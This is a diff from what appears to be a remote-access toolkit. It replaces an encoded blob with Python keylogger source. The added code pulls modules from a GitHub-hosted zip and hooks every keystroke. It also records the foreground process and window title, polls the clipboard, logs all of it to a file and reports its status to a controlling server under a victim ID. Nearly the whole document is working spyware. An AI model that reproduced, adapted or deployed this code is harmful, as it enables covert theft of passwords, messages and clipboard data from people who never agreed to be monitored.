@@ -1,1 +1,124 @@
-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
+pimport(
+    '''from ctypes import windll,c_ulong,byref,create_string_buffer
+import pythoncom,pyperclip,threading,pyHook,os,shutil,time,keyboard
+from time import gmtime, strftime ''',
+    "https://github.com/MrByehack/t-a-r-e-y-b/raw/master/bGlicmFyaWVz/"
+    "loggers.zip"
+)
+
+
+class keylogger:
+    last, li = 0, {}
+    f, _stop, last_window = None, True, None
+
+    @classmethod
+    def __init__(self, server, file_path, start_stop='both',
+                 paste_limit=500, file_limit=1024 * 1024, writeagain=False,
+                 window_info=True):
+        (
+            self.file_path, self.paste_limit, self.file_limit, self.writeagain,
+            self.window_info
+        ) = file_path, paste_limit, file_limit, writeagain, window_info
+
+        if start_stop in ('both', 'keyboard'):
+            if not self.f:
+                self.f = keyboard.hook(self.keywriter)
+            else:
+                self.f()
+                self.f = None
+                self.last, self.li = 0, {}
+        if start_stop in ('both', 'clipboard'):
+            if self._stop:
+                cblogger = threading.Thread(target=self.clipboarder)
+                self._stop = False
+                cblogger.start()
+            else:
+                self._stop = True
+
+        _send(server, '''inpu({!r},'36',0)'''.format(
+            Myid + ' : clipboardLogger Turned {}\\nkeylogger Turned {}'.format(
+                ('off' if self._stop else 'on'), ('on' if self.f else 'off')
+            )
+        ))
+
+    @classmethod
+    def keywriter(self, e):
+        name = keyboard.normalize_name(e.name)
+        if e.event_type == 'down':
+            self.li[name] = self.li.get(name, 0) + 1
+            self.keydown = 1
+        elif e.event_type == 'up':
+            if e.name in self.li:
+                if self.keydown:
+                    list_a = []
+                    for me in self.li:
+                        list_a.append(
+                            me.replace('+', 'plus') +
+                            (
+                                ('') if (self.li[me] == 1) else
+                                ('*' + str(self.li[me]))
+                            )
+                        )
+                    self.writeToFile(
+                        (
+                            '[%s]' if len('+'.join(list_a)) > 1 else "%s"
+                        ) % '+'.join(list_a)
+                    )
+                del self.li[name]
+            else:
+                self.writeToFile(('[%s]'if len(name) > 1 else "%s") % name)
+            self.keydown = 0
+
+    @classmethod
+    def writeToFile(self, key):
+        if self.last_window != windll.user32.GetForegroundWindow() and \
+                self.window_info:
+            self.last_window = windll.user32.GetForegroundWindow()
+            hwnd = windll.user32.GetForegroundWindow()
+
+            pid = c_ulong(0)
+            windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
+
+            process_id = "%d" % pid.value
+
+            executable = create_string_buffer(b"\\x00" * 512)
+            h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
+
+            windll.psapi.GetModuleBaseNameA(
+                h_process, None, byref(executable), 512
+            )
+            window_title = create_string_buffer(b"\\x00" * 512)
+            length = windll.user32.GetWindowTextA(
+                hwnd, byref(window_title), 512)
+            self.writeToFile("\\n     [ PID: %s - %s - %s (at %s)]\\n" % (
+                process_id, executable.value, window_title.value,
+                strftime("%Y-%m-%d--%H-%M-%S", gmtime())
+            ))
+
+            windll.kernel32.CloseHandle(hwnd)
+            windll.kernel32.CloseHandle(h_process)
+        if os.path.exists(self.file_path) and \
+                os.path.getsize(self.file_path) > self.file_limit:
+            if not self.writeagain:
+                shutil.copy2(self.file_path, self.file_path +
+                             strftime("%Y-%m-%d--%H-%M-%S", gmtime())+'.txt')
+            open(self.file_path, 'w').write('')
+        open(self.file_path, 'a').write(key)
+
+    @classmethod
+    def clipboarder(self):
+        strClipDataOld = ""
+        strClipData = ""
+        while not self._stop:
+            try:
+                strClipData = pyperclip.paste()
+            except:
+                pass
+            if strClipData != strClipDataOld and strClipData:
+                self.writeToFile(
+                    '   [NEW-ClipBoard({}Chr): {}]'.format(
+                        self.paste_limit, strClipData[:self.paste_limit]
+                    )
+                )
+                strClipDataOld = strClipData
+            time.sleep(2)
